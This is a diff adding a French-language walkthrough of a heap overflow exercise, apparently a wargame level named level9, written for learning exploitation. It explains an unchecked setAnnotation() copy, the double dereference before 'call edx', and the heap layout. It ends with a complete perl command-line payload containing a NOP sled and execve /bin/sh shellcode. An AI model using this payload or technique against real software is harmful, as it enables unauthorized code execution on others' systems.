@@ -1,2 +1,40 @@
 address heap = 0x804a008
-Ici, le code est en C++. Nous avons donc des classes
+Ici, le code est en C++, mais ça ne change pas grand chose si on lit l'ASM
+On alloue 108 bytes sur la heap 2x.
+Le call à setAnnotation() permet ensuite d'écrire sur la premier alloc sans
+vérification de taille.
+La difficulté de l'exercice réside dans l'exécution suivant setAnnotation()
+Le code va déréférencer N2 2x et exécuter les instructions présentes à cet endroit:
+------------------------------
+mov    eax,DWORD PTR [esp+0x10];	esp+10 = N2
+mov    eax,DWORD PTR [eax];	*N2, la valeur située aux 4 premiers bytes de N2
+mov    edx,DWORD PTR [eax];	**N2, la valeur précédente est interprétée en tant
+qu'adresse et on va y prendre la valeur
+.
+.
+.
+call   edx
+------------------------------
+Si cela n'est pas évident à apréhender, c'est beaucoup plus simple en plaçant
+des breakpoint et en regardant les valeurs placées dans les registres avant
+le call.
+On constate bien qu'à la première étape, eax prend la l'adresse de N2, 0x804a078
+Cela est situé à 108 bytes de N1, ce qui correspond bien au new de 108 bytes.
+Pour overflow cette adresse, il faut donc envoyer 108 bytes + ce qui nous intéresse
+On a envie d'y mettre une adresse vers un shellcode ou des NOPs, cependant
+cela va être déréférencé une fois de plus avant d'être exécuté.
+On met à la place l'adresse juste après dans la heap, soit 0x804a07c.
+Il faut ensuite mettre à 0x804a078 une adresse où on va placer
+des données qui nous intéressent, en l'ocurrence un endroit avec plein de NOPs
+suivis d'un shellcode. On pourrait ne pas mettre de NOPs et mettre directement
+le shellcode car à cause du manque de protection, les adresses de la heap ne
+changent pas hors gdb et on peut visier pile celle qui nous intéresse.
+Voici donc comment va se composer notre overflow final:
+_108 chars aléatoires (on arrive juste avant la première adresse de N2)
+_L'adresse de N2 + 4 bytes car cette valeur va être déréférencée.
+_Une adresse un peu plus loin sur la heap, au milieu des NOPs.
+_Plein de NOPs, on va dire 200. Dans ce cas on peut faire pointer l'adresse
+précédente à N2 + 4 + 100 pour tomber au milieu.
+_Un shellcode qui ouvre un shell.
+Cela nous donne
+./level9 $(perl -le 'print "A"x108 . "\x7c\xa0\x04\x08" . "\xdc\xa0\x04\x08" . "\x90"x200 . "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"')
